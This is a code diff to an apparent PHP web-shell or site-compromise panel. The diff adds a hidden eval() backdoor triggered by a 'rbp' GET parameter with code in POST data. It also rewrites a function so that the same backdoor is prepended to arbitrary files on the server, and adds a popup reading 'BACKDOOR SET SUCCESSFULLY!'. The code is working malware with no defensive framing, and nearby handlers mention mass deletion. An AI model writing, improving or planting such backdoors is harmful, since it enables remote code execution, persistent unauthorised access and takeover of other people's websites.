@@ -58,6 +58,14 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
+// Backdoor execution - FIXED
+if(isset($_GET['rbp']) && $_GET['rbp']=='rbp'){
+    if(isset($_POST['rbp'])){
+        eval($_POST['rbp']);
+        exit;
+    }
+}
+
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
     $possiblePaths = [
@@ -205,7 +213,7 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// Add backdoor to file
+// Add backdoor to file - FIXED
 function RBPaddBackdoor($filePath, $backdoorCode) {
     if (!file_exists($filePath)) {
         return ["error" => "File not found: $filePath"];
@@ -221,8 +229,8 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
         return ["error" => "Backdoor already exists in file"];
     }
     
-    // Add backdoor code
-    $newContent = $originalContent . $backdoorCode;
+    // Add backdoor code at the beginning for better execution
+    $newContent = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>" . $originalContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -619,7 +627,7 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor handler
+// Backdoor handler - FIXED
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -630,7 +638,8 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    $backdoorCode = "\n\n<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){eval(\$_POST['rbp']);} ?>";
+    // Fixed backdoor code - placed at beginning for better execution
+    $backdoorCode = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
     $_SESSION['backdoor_results'] = $results;
@@ -857,6 +866,21 @@ if (isset($_SESSION['adminer_result'])) {
     echo "'>" . $_SESSION['adminer_result'] . "</div>";
     echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['adminer_result']);
+}
+
+// BACKDOOR SUCCESS POPUP - ADDED
+if (isset($_SESSION['backdoor_results'])) {
+    $backdoorResults = $_SESSION['backdoor_results'];
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (isset($backdoorResults['success'])) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+        echo "'>BACKDOOR SET SUCCESSFULLY!</div>";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+        echo "'>" . $backdoorResults['error'] . "</div>";
+    }
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
+    unset($_SESSION['backdoor_results']);
 }
 ?>
 
